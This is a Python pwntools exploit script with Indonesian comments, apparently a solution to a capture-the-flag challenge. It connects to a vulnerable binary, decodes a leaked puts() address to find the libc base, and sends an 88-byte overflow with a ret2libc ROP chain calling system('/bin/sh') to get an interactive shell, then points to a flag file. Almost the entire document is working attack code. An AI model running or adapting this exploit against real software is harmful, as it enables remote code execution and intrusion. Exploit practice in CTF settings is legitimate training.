#!/usr/bin/env python3
from pwn import *

# --- Konfigurasi ---
BINARY_NAME = './vuln'
LIBC_NAME = './libc.so.6'
HOST = '127.0.0.1'
PORT = 1341 
OFFSET_TO_RIP = 88

# --- Setup Pwntools ---
context.binary = BINARY_NAME
elf = ELF(BINARY_NAME)
libc = ELF(LIBC_NAME)
p = remote(HOST, PORT)

# --- Tahap 1: Menerima Leak & Menghitung Alamat ---
p.recvuntil(b'hanya sebuah huruf acak: ')
leaked_puts_b64 = p.recvline().strip()
leaked_puts_str = base64.b64decode(leaked_puts_b64).decode('utf-8')
leaked_puts_addr = int(leaked_puts_str, 16)
log.info(f"Alamat puts() yang bocor (setelah didecode): {hex(leaked_puts_addr)}")

libc_base = leaked_puts_addr - libc.symbols['puts']
log.success(f"Base address libc terhitung: {hex(libc_base)}")

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
log.info(f"Alamat system() ditemukan di: {hex(system_addr)}")
log.info(f"Alamat '/bin/sh' ditemukan di: {hex(bin_sh_addr)}")

# --- Tahap 2: Menyusun ROP Chain & Mendapatkan Shell ---
rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

log.info(f"Gadget 'pop rdi; ret' ditemukan di: {hex(pop_rdi_ret)}")

payload = b'A' * OFFSET_TO_RIP
payload += p64(ret_gadget)
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

log.info("Mengirim payload ROP chain...")
p.sendlineafter(b'> ', payload)

log.success("Berhasil! Anda mendapatkan shell.")
log.info("Ketik 'cat /home/player/flag.txt' untuk mendapatkan flag bagian pertama.")
p.interactive()